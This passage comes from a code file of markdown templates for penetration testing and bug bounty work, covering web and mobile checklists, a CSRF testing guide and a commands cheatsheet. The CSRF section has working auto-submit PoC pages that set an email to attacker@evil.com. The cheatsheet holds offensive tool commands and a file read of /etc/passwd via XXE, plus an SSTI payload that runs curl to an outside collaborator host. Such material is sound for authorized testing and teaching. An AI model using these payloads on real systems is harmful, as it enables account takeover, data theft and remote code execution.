  - **Tester**: [Your Name/Team]
  - **Test Type**: [Black Box/Grey Box/White Box]
  - **Environment**: [Production/Staging/Development]
  
  ## 1. Reconnaissance
  
  ### Information Gathering
  - [ ] Identify target technology stack
  - [ ] Domain/subdomain enumeration
  - [ ] Whois/DNS analysis
  - [ ] IP range identification
  - [ ] Search for leaked credentials (GitHub, Pastebin)
  - [ ] Review public documents/job postings for tech stack info
  - [ ] Social media reconnaissance
  - [ ] Google dorking
  
  ### Infrastructure Mapping
  - [ ] Network port scanning
  - [ ] Service fingerprinting
  - [ ] CDN detection
  - [ ] WAF detection and fingerprinting
  - [ ] Load balancer detection
  - [ ] Third-party services identification
  - [ ] Cloud provider identification
  
  ### Content Discovery
  - [ ] Directory brute forcing
  - [ ] Robots.txt/sitemap.xml analysis
  - [ ] JavaScript file analysis
  - [ ] Hidden parameter discovery
  - [ ] API endpoint discovery
  - [ ] Historical content (Wayback Machine)
  
  ## 2. Application Analysis
  
  ### Authentication Testing
  - [ ] User registration process
  - [ ] Authentication mechanisms
  - [ ] Password policy
  - [ ] Multi-factor authentication
  - [ ] Session management
  - [ ] Account lockout
  - [ ] Password reset functionality
  - [ ] OAuth/SSO implementation
  - [ ] Remember me functionality
  - [ ] HTTP basic authentication checks
  
  ### Authorization Testing
  - [ ] Role-based access control
  - [ ] Horizontal privilege escalation
  - [ ] Vertical privilege escalation
  - [ ] Insecure direct object references
  - [ ] File/directory permissions
  - [ ] Business logic flaws
  - [ ] URL-based access control
  
  ### Session Management
  - [ ] Cookie attributes (Secure, HttpOnly, SameSite)
  - [ ] Session timeout
  - [ ] Session fixation
  - [ ] CSRF token implementation
  - [ ] Concurrent session handling
  - [ ] Session invalidation on logout
  - [ ] Session puzzling
  
  ### Input Validation & Sanitization
  - [ ] Reflected XSS
  - [ ] Stored XSS
  - [ ] DOM-based XSS
  - [ ] HTML injection
  - [ ] SQL injection
  - [ ] NoSQL injection
  - [ ] LDAP injection
  - [ ] XML injection/XXE
  - [ ] Command injection
  - [ ] Template injection
  - [ ] SMTP/Mail injection
  - [ ] XPath injection
  - [ ] Remote file inclusion
  - [ ] Local file inclusion
  - [ ] Format string vulnerabilities
  - [ ] Host header injection
  - [ ] HTTP request smuggling
  - [ ] CRLF injection
  
  ### Business Logic Testing
  - [ ] Workflow bypass
  - [ ] Business rules testing
  - [ ] Abuse of functionality
  - [ ] Logic/time-based attacks
  - [ ] Rate limiting/anti-automation
  - [ ] Mass assignment
  - [ ] Race conditions
  - [ ] Numerical limits/overflow
  - [ ] Discount/promotion abuse
  - [ ] Feature misuse
  
  ### File Upload Testing
  - [ ] File type validation bypass
  - [ ] File size validation
  - [ ] Malicious file upload
  - [ ] Metadata exploitation
  - [ ] File content validation
  - [ ] File name handling
  - [ ] Race condition in upload
  - [ ] Upload directory traversal
  
  ### API Testing
  - [ ] API documentation analysis
  - [ ] Authentication/authorization
  - [ ] Rate limiting
  - [ ] Input validation
  - [ ] Error handling
  - [ ] HTTP method handling
  - [ ] Parameter tampering
  - [ ] Endpoint fuzzing
  - [ ] GraphQL specific testing
  - [ ] API versioning issues
  
  ## 3. Configuration & Deployment Testing
  
  ### Server Configuration
  - [ ] HTTP security headers
  - [ ] SSL/TLS configuration
  - [ ] SSL/TLS vulnerabilities
  - [ ] HTTP methods
  - [ ] Default credentials
  - [ ] Directory listing
  - [ ] Backup files/directories
  - [ ] Development/debug endpoints
  - [ ] Error handling/information disclosure
  - [ ] Server-side template injection
  
  ### Infrastructure Testing
  - [ ] Container security
  - [ ] Cloud storage permissions
  - [ ] Service misconfigurations
  - [ ] Sensitive data in URLs/repositories
  - [ ] Open source component analysis
  - [ ] Supply chain vulnerabilities
  - [ ] Docker/Kubernetes security
  
  ### Data Protection
  - [ ] Sensitive data in client-side code
  - [ ] Caching issues
  - [ ] Insecure data storage
  - [ ] Cleartext transmission
  - [ ] Exfiltration channels
  - [ ] Information leakage
  - [ ] Hidden form fields
  
  ## 4. Client-Side Testing
  
  ### Frontend Security
  - [ ] Content Security Policy
  - [ ] Cross-Origin Resource Sharing
  - [ ] Clickjacking protection
  - [ ] WebSockets security
  - [ ] HTML5 security features
  - [ ] Client-side storage security
  - [ ] Browser developer tools analysis
  - [ ] Front-end JavaScript libraries
  - [ ] SPA security issues
  - [ ] Postmessage vulnerabilities
  
  ### Mobile Integration
  - [ ] Deep linking
  - [ ] Mobile-web integration
  - [ ] WebView vulnerabilities
  - [ ] App transport security
  - [ ] Certificate pinning bypass
  
  ## 5. Reporting
  
  ### Vulnerability Documentation
  - [ ] Detailed technical description
  - [ ] Reproduction steps
  - [ ] Proof of concept
  - [ ] Screenshots/videos
  - [ ] Impact assessment
  - [ ] CVSS scoring
  - [ ] Remediation recommendations
  - [ ] References/resources
  
  ### Follow-up
  - [ ] Verification of fixes
  - [ ] Regression testing
  - [ ] Detailed technical notes
  - [ ] Root cause analysis
  - [ ] Hardening recommendations
  
  ## Severity Classification
  
  ### Critical
  - Remote code execution
  - Full system compromise
  - Significant data breach
  - Authentication bypass affecting all users
  - SQL injection with admin access
  
  ### High
  - Stored XSS affecting multiple users
  - Vertical privilege escalation
  - Significant authorization flaws
  - Sensitive data exposure
  - CSRF with significant impact
  
  ### Medium
  - Reflected XSS requiring user interaction
  - Horizontal privilege escalation
  - Most CSRF vulnerabilities
  - Open redirect
  - Some information disclosure
  
  ### Low
  - Minor information disclosure
  - Clickjacking with limited impact
  - Self-XSS
  - Logical flaws with minimal impact
  - Missing security headers
  
  ### Informational
  - Best practice recommendations
  - Minor configuration issues
  - Outdated libraries without known vulnerabilities
  - Verbose error messages
  
  ## References
  - [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
  - [OWASP Top 10](https://owasp.org/Top10/)
  - [SANS Top 25](https://www.sans.org/top25-software-errors/)
  - [Web Application Hacker's Handbook](https://portswigger.net/web-security)
  - [Bug Bounty Hunting Methodology](https://github.com/jhaddix/tbhm)`
    },
    {
      id: 'template-mobile',
      name: 'Mobile App Security Testing',
      category: 'vulnerability',
      content: `# Mobile Application Security Testing
  
  ## Target Information
  - **App Name**: 
  - **Version**: 
  - **Platform**: [iOS/Android/Both]
  - **Testing Approach**: [Static/Dynamic/Hybrid]
  - **Device(s) Used**: 
  - **Jailbroken/Rooted**: [Yes/No]
  
  ## Testing Environment
  - **Tools Used**: [Mobile Security Framework/OWASP ZAP/Burp Suite/Frida/Objection]
  - **Proxy Configuration**: 
  - **Certificate Installation**: 
  
  ## 1. Application Mapping
  
  ### App Components
  - [ ] Activities/ViewControllers
  - [ ] Services/Background processes
  - [ ] Broadcast receivers
  - [ ] Content providers/URL schemes
  - [ ] Exported components
  - [ ] Deep links
  - [ ] WebViews
  - [ ] Custom URL schemes
  
  ### App Permissions
  *List and analyze all permissions*
  
  ### Third-Party Libraries
  *Identify and analyze third-party components*
  
  ### Network Communications
  *Document all endpoints the app communicates with*
  
  ## 2. Static Analysis
  
  ### Binary Analysis
  - [ ] App binary protection (anti-tampering)
  - [ ] Obfuscation level
  - [ ] Reverse engineering resistance
  - [ ] Debugging prevention
  - [ ] Emulator detection
  - [ ] Root/jailbreak detection
  - [ ] Code signing verification
  
  ### Source Code Review (if available)
  - [ ] Authentication implementation
  - [ ] Authorization checks
  - [ ] Input validation
  - [ ] Cryptographic implementations
  - [ ] Session management
  - [ ] Inter-Process Communication
  - [ ] WebView implementation
  - [ ] Custom schemes handling
  
  ### Data Storage Analysis
  - [ ] Sensitive data in shared preferences
  - [ ] SQLite database security
  - [ ] Realm database security
  - [ ] Property list files (iOS)
  - [ ] NSUserDefaults (iOS)
  - [ ] Keychain usage (iOS)
  - [ ] Keystores (Android)
  - [ ] Android Keystore System
  - [ ] File system storage
  - [ ] Cache data
  - [ ] Log files
  - [ ] Screenshot protection
  - [ ] Keyboard cache
  - [ ] Copy/paste buffer protection
  
  ### Manifest Analysis (Android)
  - [ ] AndroidManifest.xml permissions
  - [ ] Exported components
  - [ ] Intent filters
  - [ ] Custom permissions
  - [ ] Backup settings
  - [ ] Debuggable flag
  - [ ] AllowBackup flag
  - [ ] Network security config
  
  ### Info.plist Analysis (iOS)
  - [ ] URL schemes
  - [ ] ATS exceptions
  - [ ] Permission usage descriptions
  - [ ] Background execution
  - [ ] Data protection classes
  
  ## 3. Dynamic Analysis
  
  ### Authentication & Authorization
  - [ ] Authentication bypass
  - [ ] Session management
  - [ ] Token handling
  - [ ] Biometric authentication
  - [ ] Account lockout
  - [ ] Password policies
  - [ ] Multi-factor authentication
  
  ### Network Security
  - [ ] SSL pinning implementation
  - [ ] SSL pinning bypass attempts
  - [ ] Certificate validation
  - [ ] HTTP vs HTTPS usage
  - [ ] Clear text transmission
  - [ ] API security testing
  - [ ] Custom protocol handlers
  - [ ] DNS security
  
  ### Data Security
  - [ ] Runtime memory analysis
  - [ ] Sensitive data in memory
  - [ ] Keyboard caching
  - [ ] Screenshots in background
  - [ ] Copy/paste buffer security
  - [ ] Accessibility service risks
  
  ### Client-Side Injection
  - [ ] WebView vulnerabilities
  - [ ] JavaScript bridges
  - [ ] XSS in WebViews
  - [ ] Local file inclusion
  - [ ] URL scheme abuse
  - [ ] Intent redirection
  - [ ] Deep link hijacking
  
  ### Platform Specific Testing
  
  #### Android
  - [ ] Content provider exposure
  - [ ] Broadcast receiver vulnerabilities
  - [ ] Task hijacking
  - [ ] Tapjacking
  - [ ] Fragment injection
  - [ ] Insecure IPC
  - [ ] Implicit intents
  - [ ] External storage usage
  - [ ] App permissions abuse
  
  #### iOS
  - [ ] URL scheme handling
  - [ ] Pasteboard usage
  - [ ] Keychain data protection
  - [ ] TouchID/FaceID implementation
  - [ ] Swift/Objective-C runtime manipulation
  - [ ] Swizzling protection
  - [ ] Data Protection API usage
  - [ ] Extension vulnerabilities
  
  ### Anti-Tampering & Reverse Engineering
  - [ ] Root/jailbreak detection bypass
  - [ ] Emulator detection bypass
  - [ ] Code obfuscation assessment
  - [ ] Runtime manipulation resistance
  - [ ] Instrumentation detection
  - [ ] Anti-debugging bypasses
  - [ ] Dynamic library injection
  
  ### Sensitive Functionality
  - [ ] Payment functionality
  - [ ] In-app purchases
  - [ ] Cryptographic implementations
  - [ ] Offline authentication
  - [ ] Secure communication
  - [ ] Feature access control
  
  ## 4. Business Logic Testing
  - [ ] Authentication workflows
  - [ ] Authorization decisions
  - [ ] Transactional integrity
  - [ ] Feature misuse potential
  - [ ] Race conditions
  - [ ] Client-side business rules
  - [ ] Server synchronization issues
  
  ## 5. Backend API Testing
  - [ ] Authentication/authorization
  - [ ] Input validation
  - [ ] Rate limiting
  - [ ] API versioning
  - [ ] Endpoint enumeration
  - [ ] Parameter tampering
  - [ ] Insecure direct object references
  
  ## Vulnerabilities Found
  *Document each vulnerability with detailed reproduction steps*
  
  ### Vulnerability 1: [Title]
  - **Description**: 
  - **Reproduction Steps**:
    1. 
    2. 
    3. 
  - **Impact**:
  - **Remediation**:
  
  ## Risk Rating Matrix
  | Vulnerability | Severity | CVSS Score | Exploitability | Impact |
  |---------------|----------|------------|----------------|--------|
  |               |          |            |                |        |
  
  ## Recommendations
  *Provide detailed remediation steps for each identified issue*
  
  ### General Security Improvements
  1. 
  2. 
  3. 
  
  ## References
  - [OWASP Mobile Top 10](https://owasp.org/www-project-mobile-top-10/)
  - [OWASP Mobile Security Testing Guide](https://owasp.org/www-project-mobile-security-testing-guide/)
  - [OWASP Mobile Application Security Verification Standard](https://owasp.org/www-project-mobile-security-testing-guide/)
  - [Android App Security Checklist](https://developer.android.com/topic/security/best-practices)
  - [iOS App Security Best Practices](https://developer.apple.com/documentation/security)`
    },
    {
      id: 'template-bug-hunting',
      name: 'Bug Bounty Hunting Checklist',
      category: 'general',
      content: `# Bug Bounty Hunting Checklist
  
  ## Target Scope Analysis
  - [ ] Read program policy/scope carefully
  - [ ] Document in-scope domains/subdomains
  - [ ] Note out-of-scope assets/vulnerabilities
  - [ ] Identify previously reported issues
  - [ ] Check for public vulnerability disclosures
  - [ ] Understand target business model
  - [ ] Identify high-value assets/functionality
  
  ## Process Management
  
  ### Setting Up
  - [ ] Create dedicated environment for testing
  - [ ] Set up project documentation system
  - [ ] Configure proxies (Burp/ZAP)
  - [ ] Prepare testing tools
  - [ ] Set up cloud VPS if needed
  - [ ] Establish collaboration workflow (if team hunting)
  
  ### Documentation
  - [ ] Document all findings, even if not reportable
  - [ ] Take clear screenshots
  - [ ] Record proof-of-concept videos
  - [ ] Maintain detailed notes about attack paths
  - [ ] Track time spent on each target
  - [ ] Document successful/unsuccessful approaches
  - [ ] Note potential vulnerability chains
  
  ## Reconnaissance Phase
  
  ### Surface Mapping
  - [ ] Domain/subdomain enumeration
    - [ ] Sublist3r, Amass, Subfinder
    - [ ] Certificate transparency logs
    - [ ] Google dorking
    - [ ] DNS brute force
    - [ ] Permutation scanning
    - [ ] Subdomain takeover checks
    - [ ] Cloud service enumeration
  - [ ] Content discovery
    - [ ] Directory brute forcing
    - [ ] Recursive content discovery  
    - [ ] Backup/old file discovery (.bak, .old, etc.)
    - [ ] Hidden files/directories
    - [ ] Source code review (client-side)
  
  ### Technology Profiling
  - [ ] Web server identification
  - [ ] CMS detection
  - [ ] JavaScript frameworks
  - [ ] Third-party components
  - [ ] Cloud infrastructure identification
  - [ ] Custom application frameworks
  - [ ] Database technologies
  - [ ] WAF/security solutions identification
  
  ### Data Mining
  - [ ] GitHub repository analysis
  - [ ] Public data leaks
  - [ ] Historical content (Wayback Machine)
  - [ ] OSINT for employee information
  - [ ] Public API documentation
  - [ ] Mobile app analysis
  - [ ] Job listings for tech stack details
  
  ## Vulnerability Testing
  
  ### Web Application Testing
  - [ ] Authentication testing
    - [ ] Brute force protection
    - [ ] Password reset flaws
    - [ ] Session management
    - [ ] OAuth/SAML vulnerabilities
    - [ ] JWT issues
    - [ ] 2FA/MFA bypasses
    - [ ] Password policy
    - [ ] Account takeover vectors
  
  - [ ] Authorization flaws
    - [ ] IDOR testing
    - [ ] Privilege escalation
    - [ ] Role-based access control
    - [ ] Missing function-level authorization
    - [ ] API authorization
    - [ ] Hidden administrative functionality
  
  - [ ] Injection attacks
    - [ ] SQL injection
    - [ ] NoSQL injection
    - [ ] Command injection
    - [ ] Template injection
    - [ ] XSS (reflected, stored, DOM)
    - [ ] XXE injection
    - [ ] SMTP injection
    - [ ] LDAP injection
    - [ ] Expression language injection
  
  - [ ] Server-side vulnerabilities
    - [ ] SSRF
    - [ ] LFI/RFI
    - [ ] Open redirects
    - [ ] Path traversal
    - [ ] Request smuggling
    - [ ] Response splitting
    - [ ] Deserialization flaws
  
  - [ ] Security misconfigurations
    - [ ] Default credentials
    - [ ] Development features enabled
    - [ ] Verbose error messages
    - [ ] Default/test accounts
    - [ ] Insecure HTTP headers
    - [ ] Directory listing enabled
    - [ ] Backup files exposure
  
  ### Mobile Application Testing
  - [ ] API security
  - [ ] Client-side data storage
  - [ ] Sensitive data in code
  - [ ] Certificate pinning
  - [ ] Deep link vulnerabilities
  - [ ] Manifest issues (Android)
  - [ ] Info.plist issues (iOS)
  - [ ] Insecure WebView implementation
  
  ### Infrastructure Testing
  - [ ] Subdomain takeover
  - [ ] Cloud storage misconfigurations
  - [ ] Open S3 buckets
  - [ ] Exposed Git repositories
  - [ ] Public dashboard/admin panels
  - [ ] Development/staging environments
  - [ ] Container security issues
  - [ ] Network security misconfigurations
  
  ## Bug Bounty Hunting Techniques
  
  ### Methodology Approaches
  - [ ] Asset-focused approach (test one asset deeply)
  - [ ] Vulnerability-focused approach (hunt specific vulnerability types)
  - [ ] Logic flaw hunting (understand business logic)
  - [ ] Chaining vulnerabilities (combine low severity issues)
  - [ ] Race condition testing
  - [ ] Mass scanning approach
  - [ ] Manual deep-dive testing
  
  ### Advanced Techniques
  - [ ] Prototype pollution
  - [ ] DOM clobbering
  - [ ] HTTP request smuggling
  - [ ] Browser cache poisoning
  - [ ] Web cache poisoning
  - [ ] Web cache deception
  - [ ] GraphQL introspection/abuse
  - [ ] Cookie bombing
  - [ ] HTTP parameter pollution
  - [ ] JSON parameter pollution
  - [ ] CSP bypass techniques
  - [ ] Clickjacking with prefilled forms
  
  ### Report Writing
  - [ ] Clear title with vulnerability type
  - [ ] Concise executive summary
  - [ ] Detailed technical description
  - [ ] Clear reproduction steps
  - [ ] Proof of concept code/screenshots
  - [ ] Impact description
  - [ ] Realistic attack scenario
  - [ ] Remediation suggestions
  - [ ] References to similar vulnerabilities
  
  ## Tools & Resources
  
  ### Reconnaissance Tools
  - Amass, Subfinder, Assetfinder
  - Nuclei, httpx, Meg
  - Dirsearch, Feroxbuster, Gobuster
  - Waybackurls, gau, hakrawler
  - GitHound, TruffleHog, gitleaks
  
  ### Exploitation Tools
  - Burp Suite, OWASP ZAP
  - SQLmap, NoSQLmap
  - XSStrike, XSS Hunter
  - JWT_Tool, OAuth2_Tool
  - Hackvertor, CyberChef
  
  ### Collaboration Tools
  - Notion, Obsidian
  - HackMD, Google Docs
  - Jira, Trello
  
  ### Learning Resources
  - HackerOne Hacktivity
  - Bugcrowd University
  - PortSwigger Web Academy
  - OWASP Testing Guide
  - Bug bounty writeups
  - CTF challenges
  
  ## References
  - [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
  - [Web Application Hacker's Handbook](https://portswigger.net/web-security)
  - [Bug Bounty Hunting Methodology](https://github.com/jhaddix/tbhm)
  - [HackerOne's Hacker101](https://www.hacker101.com/)
  - [Bugcrowd's University](https://www.bugcrowd.com/hackers/bugcrowd-university/)`
    },
    {
      id: 'template-csrf',
      name: 'CSRF Testing',
      category: 'vulnerability',
      content: `# Cross-Site Request Forgery (CSRF) Testing
  
  ## Target Information
  - **Application**: 
  - **Vulnerable Endpoints**: 
  - **Authentication Required**: [Yes/No]
  
  ## Vulnerability Description
  Cross-Site Request Forgery (CSRF) occurs when an attacker tricks a victim's browser into making an unwanted request to a website where the victim is authenticated, potentially causing state-changing actions.
  
  ## Testing Methodology
  
  ### 1. Identify Potential CSRF Targets
  - [ ] User profile updates
  - [ ] Password changes
  - [ ] Email/phone number changes
  - [ ] Two-factor authentication settings
  - [ ] Account settings modifications
  - [ ] Fund transfers/payments
  - [ ] Subscription changes
  - [ ] User role/permission changes
  - [ ] Message/comment posting
  - [ ] Data deletion actions
  
  ### 2. Analyze CSRF Protections
  - [ ] CSRF token implementation
    - [ ] Check for token presence
    - [ ] Verify token validation
    - [ ] Test token reuse
    - [ ] Test token expiration
  - [ ] SameSite cookie attribute
    - [ ] Check for Strict/Lax/None setting
  - [ ] Custom headers (X-Requested-With)
  - [ ] Referer/Origin header validation
  - [ ] Double submit cookie pattern
  - [ ] CAPTCHA/user interaction requirements
  - [ ] Multi-step processes
  
  ### 3. Test CSRF Token Weaknesses
  - [ ] Token absence testing
    - [ ] Remove token completely
    - [ ] Leave parameter with empty value
  - [ ] Token manipulation
    - [ ] Use tokens from different users/sessions
    - [ ] Use old/expired tokens
    - [ ] Test predictable tokens
    - [ ] Test static tokens
  - [ ] Token placement
    - [ ] Move from body to URL
    - [ ] Move from URL to body
    - [ ] Move from header to cookie
  
  ### 4. Bypass Techniques
  - [ ] Change request method (GET/POST/PUT)
  - [ ] Modify content-type
    - [ ] application/x-www-form-urlencoded
    - [ ] application/json
    - [ ] multipart/form-data
    - [ ] text/plain
  - [ ] Flash-based CSRF
  - [ ] Same-origin policy bypass methods
  - [ ] XSS + CSRF combination
  - [ ] Clickjacking + CSRF combination
  
  ### 5. CSRF Proof-of-Concept Development
  - [ ] HTML form with auto-submit
  - [ ] XMLHttpRequest/Fetch API
  - [ ] HTML5 features (iframe, embed)
  - [ ] JavaScript dynamic form generation
  - [ ] Specially crafted image tags
  - [ ] JSONP exploitation
  
  ## HTML/JavaScript Proof of Concept Templates
  
  ### Basic Auto-Submit Form
  \`\`\`html
  <html>
    <body onload="document.forms[0].submit()">
      <form action="https://vulnerable-site.com/change_email" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com" />
      </form>
    </body>
  </html>
  \`\`\`
  
  ### JSON Content-Type Request
  \`\`\`html
  <script>
    fetch('https://vulnerable-site.com/api/update_profile', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        "name": "Hacked User",
        "email": "attacker@evil.com"
      })
    });
  </script>
  \`\`\`
  
  ### Multipart Form Data
  \`\`\`html
  <html>
    <body>
      <script>
        function submitFormData() {
          var formData = new FormData();
          formData.append('profile_image', file);
          formData.append('name', 'Hacked User');
          
          var xhr = new XMLHttpRequest();
          xhr.open('POST', 'https://vulnerable-site.com/upload_profile', true);
          xhr.withCredentials = true;
          xhr.send(formData);
        }
        document.addEventListener('DOMContentLoaded', submitFormData);
      </script>
    </body>
  </html>
  \`\`\`
  
  ## Results
  
  ### Vulnerable Endpoints
  | Endpoint | HTTP Method | CSRF Protection | Bypass Method | Impact |
  |----------|-------------|-----------------|---------------|--------|
  |          |             |                 |               |        |
  
  ### Protection Analysis
  *Document the CSRF protections in place and their effectiveness*
  
  ## Impact Analysis
  - [ ] Account takeover
  - [ ] Data modification
  - [ ] Unauthorized transactions
  - [ ] Settings/configuration changes
  - [ ] Privacy violations
  - [ ] Administrative action execution
  - [ ] Denial of service
  
  ## Recommended Fixes
  1. Implement strong, unpredictable CSRF tokens
  2. Set SameSite cookie attribute to Strict or Lax
  3. Check both CSRF token and Referer/Origin headers
  4. Add additional authentication for sensitive operations
  5. Implement proper Content-Type validation
  6. Consider using custom request headers for AJAX requests
  7. Implement token renewal mechanism
  8. Add user confirmation for critical actions
  
  ## References
  - [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
  - [PortSwigger CSRF Guide](https://portswigger.net/web-security/csrf)
  - [CSRF Attack Examples](https://www.imperva.com/learn/application-security/csrf-cross-site-request-forgery/)
  - [HackerOne CSRF Reports](https://www.hackerone.com/knowledge-center/what-cross-site-request-forgery-csrf)`
    },
    {
      id: 'template-cheatsheet',
      name: 'Bug Bounty Commands Cheatsheet',
      category: 'general',
      content: `# Bug Bounty Commands Cheatsheet
  
  ## Subdomain Enumeration
  
  ### Passive Subdomain Enumeration
  \`\`\`bash
  # Amass passive mode
  amass enum -passive -d example.com -o subdomains.txt
  
  # Subfinder
  subfinder -d example.com -o subdomains.txt
  
  # Assetfinder
  assetfinder --subs-only example.com > subdomains.txt
  
  # Findomain
  findomain -t example.com -o
  
  # crt.sh
  curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u
  
  # SecurityTrails
  curl -s "https://api.securitytrails.com/v1/domain/example.com/subdomains" \\
    -H "APIKEY: YOUR_API_KEY" | jq -r '.subdomains[]' | awk '{print $1".example.com"}' > subdomains.txt
  \`\`\`
  
  ### Active Subdomain Enumeration
  \`\`\`bash
  # Amass active mode
  amass enum -active -d example.com -o subdomains.txt
  
  # Gobuster DNS
  gobuster dns -d example.com -w ~/wordlists/dns.txt -o subdomains.txt
  
  # Subbrute with massdns
  python subbrute.py example.com | massdns -r resolvers.txt -t A -o S -w results.txt
  \`\`\`
  
  ### Subdomain Bruteforcing
  \`\`\`bash
  # ffuf for subdomain bruteforcing
  ffuf -u https://FUZZ.example.com -w subdomains.txt -v
  
  # shuffledns
  shuffledns -d example.com -w wordlist.txt -r resolvers.txt -o results.txt
  \`\`\`
  
  ### Subdomain Takeover
  \`\`\`bash
  # Nuclei
  nuclei -l domains.txt -t takeovers/
  
  # subjack
  subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl
  
  # SubOver
  SubOver -l subdomains.txt -t 100
  \`\`\`
  
  ## Content Discovery
  
  ### Directory & File Bruteforcing
  \`\`\`bash
  # Dirsearch
  dirsearch -u https://example.com -e php,html,js,zip -x 400,403,404
  
  # Feroxbuster
  feroxbuster -u https://example.com -w wordlist.txt -x php,html,js,txt -C 404
  
  # Gobuster
  gobuster dir -u https://example.com -w wordlist.txt -x php,html,txt -b 404 -t 50
  \`\`\`
  
  ### Parameter Discovery
  \`\`\`bash
  # Arjun
  arjun -u https://example.com/api -m GET
  
  # ParamSpider
  python paramspider.py --domain example.com --level high --exclude woff,css,js,png,svg,jpg
  
  # x8
  x8 -u "https://example.com/" -w params.txt -o output.txt
  \`\`\`
  
  ### JS File Analysis
  \`\`\`bash
  # LinkFinder
  python linkfinder.py -i https://example.com -d -o results.html
  
  # getJS
  getJS --url https://example.com --complete > js.txt
  
  # SecretFinder
  python SecretFinder.py -i https://example.com/app.js -o results.html
  \`\`\`
  
  ### Wayback Machine
  \`\`\`bash
  # waybackurls
  waybackurls example.com > wayback.txt
  
  # gau (Get All URLs)
  gau example.com > gau.txt
  
  # waybackunifier
  waybackunifier -d example.com -o wayback.txt
  \`\`\`
  
  ## Port Scanning & Service Discovery
  
  ### Fast Scan
  \`\`\`bash
  # Nmap top ports
  nmap -sS -T4 -p- --max-retries 1 --min-rate 1000 example.com -oN nmap_results.txt
  
  # masscan
  masscan -p1-65535 --rate=10000 192.168.1.0/24 -oL masscan.txt
  
  # RustScan
  rustscan -a example.com -- -sV -sC
  \`\`\`
  
  ### Service Scanning
  \`\`\`bash
  # Nmap service scan
  nmap -sV -sC -p 80,443,8080,8443 example.com -oA services
  
  # nmap scripts
  nmap --script vuln -p 80,443,8080 example.com
  \`\`\`
  
  ## Web Vulnerability Scanning
  
  ### Automated Scanning
  \`\`\`bash
  # Nuclei
  nuclei -l urls.txt -t nuclei-templates/ -o nuclei_results.txt
  
  # nikto
  nikto -h https://example.com -o nikto_results.txt
  
  # Wapiti
  wapiti -u https://example.com/ -o wapiti_results
  \`\`\`
  
  ### XSS Testing
  \`\`\`bash
  # XSStrike
  python xsstrike.py -u "https://example.com/search?q=test"
  
  # kxss
  cat params.txt | kxss | grep -v "Nothing" > xss.txt
  
  # dalfox
  dalfox url "https://example.com/search?q=xss" --custom-payload-file payloads.txt
  \`\`\`
  
  ### SQLi Testing
  \`\`\`bash
  # SQLmap
  sqlmap -u "https://example.com/page.php?id=1" --dbs --batch
  
  # NoSQLmap
  python nosqlmap.py
  
  # SQLiPy (Burp extension)
  # Use through Burp Suite
  \`\`\`
  
  ### SSRF Testing
  \`\`\`bash
  # SSRFmap
  python ssrfmap.py -r request.txt -p url -m readfiles
  
  # Gopherus (SSRF exploitation)
  python gopherus.py --exploit mysql
  \`\`\`
  
  ## API Testing
  
  ### API Discovery and Testing
  \`\`\`bash
  # Postman
  # Import collection and run with Newman
  newman run collection.json -e environment.json
  
  # Fuzzapi
  python fuzzapi.py -u https://api.example.com/ -t token
  
  # Arjun for API parameters
  arjun -u https://api.example.com/endpoint -m POST
  \`\`\`
  
  ### GraphQL Testing
  \`\`\`bash
  # InQL Scanner (Burp extension)
  # Use through Burp Suite
  
  # GraphQLmap
  python graphqlmap.py -u https://example.com/graphql -v
  
  # clairvoyance (GraphQL schema recovery)
  python clairvoyance.py -s https://example.com/graphql
  \`\`\`
  
  ## Git & Source Code Analysis
  
  ### GitHub Dorks
  \`\`\`bash
  # Using GitHub search for sensitive info
  "example.com" password
  "example.com" api_key
  "example.com" apikey
  "example.com" secret
  "example.com" token
  "example.com" config
  filename:.env example.com
  filename:.gitlab-ci.yml example.com
  \`\`\`
  
  ### Git Repository Analysis
  \`\`\`bash
  # trufflehog
  trufflehog --regex --entropy=True https://github.com/username/repo
  
  # GitLeaks
  gitleaks --repo-url=https://github.com/username/repo --verbose
  
  # GitTools
  python3 gitdumper.py https://example.com/.git/ output/
  python3 extractor.py output/ extracted/
  \`\`\`
  
  ## Exploitation Tools
  
  ### XXE Injection
  \`\`\`bash
  # XXEinjector
  ruby XXEinjector.rb --host=example.com --path=/xxe --file=/etc/passwd
  
  # OXML_XXE
  # Use through Burp Suite
  \`\`\`
  
  ### CORS Misconfiguration
  \`\`\`bash
  # CORScanner
  python cors_scan.py -u https://example.com
  
  # corsy
  python corsy.py -u https://example.com
  \`\`\`
  
  ### JWT Testing
  \`\`\`bash
  # jwt_tool
  python jwt_tool.py [JWT_TOKEN] -T
  
  # jwtcat (JWT cracking)
  jwtcat -t [JWT_TOKEN] -w wordlist.txt
  \`\`\`
  
  ### SSTI Testing
  \`\`\`bash
  # tplmap
  python tplmap.py -u "https://example.com/page?name=John"
  
  # Burp Collaborator + payload
  # Use payloads like: {{config.__class__.__init__.__globals__['os'].popen('curl https://collaborator.example.com').read()}}
  \`\`\`
  
  ## Reporting & Documentation
  
  ### Screenshot Tools
  \`\`\`bash
  # EyeWitness
  python EyeWitness.py -f urls.txt --web
  
  # aquatone
  cat hosts.txt | aquatone -out ./aquatone
  
  # gowitness
  gowitness scan -f urls.txt
  \`\`\`
  
  ### Reporting Templates
  \`\`\`bash
  # Markdown template
  # Create a template.md with your structure
  
  # nuclei-template-generator
  nuclei-template-generator -kind http -path custom-templates/
  \`\`\`
  
  ## Data Processing
  
  ### Text Processing
  \`\`\`bash
  # Remove duplicates
  sort domains.txt | uniq > unique_domains.txt
  
  # Extract subdomains from mixed data
  grep -o '[a-zA-Z0-9\-\.]*\.example.com' file.txt | sort -u
  
  # Extract URLs from JavaScript
  grep -o 'https\?://[^"]\+' file.js | sort -u
  \`\`\`
  
  ### Resolve Domains to IPs
  \`\`\`bash
  # massdns
  massdns -r resolvers.txt -t A domains.txt -o S -w results.txt
  
  # dnsx
  cat domains.txt | dnsx -silent -a -resp
  \`\`\`
  
  ### HTTP Probing
  \`\`\`bash
  # httpx
  cat domains.txt | httpx -silent -status-code -title -tech-detect -follow-redirects
  
  # httprobe
  cat domains.txt | httprobe -c 50 | tee -a http_alive.txt
  
  # meg (bulk fetch)
  meg -d 1000 -v / hosts.txt
